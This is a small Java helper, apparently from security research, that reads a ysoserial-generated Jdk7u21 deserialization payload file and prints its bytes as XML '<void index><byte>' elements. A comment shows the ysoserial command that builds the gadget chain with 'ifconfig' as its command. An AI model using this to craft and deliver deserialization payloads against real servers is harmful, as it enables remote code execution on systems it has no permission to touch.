package fastjson;

import java.io.ByteArrayOutputStream;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;

public class Main {
    public static void main(String[] args)
    {
        Main de = new Main();
        try {
            de.run();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

//    java -jar ysoserial-0.0.6-SNAPSHOT-all.jar Jdk7u21 "ifconfig" > 0528.bin
    public void run() throws Exception{
        InputStream in = new FileInputStream("05281.bin");
        byte[] data = toByteArray(in);
        in.close();
        int l=0;
        int count = 0;
        for (byte bi : data){
            System.out.println("<void index=\"" + l + "\">");
            System.out.println("<byte>" + bi + "</byte>");
            System.out.println("</void>");
            l = l + 1;
            count = count + bi;
            System.out.println(count);
        }
    }

    private byte[] toByteArray(InputStream in) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        byte[] buffer = new byte[1024*4];
        int n = 0;
        while ((n = in.read(buffer)) != -1) {
            out.write(buffer, 0, n);
        }
        return out.toByteArray();
    }
}
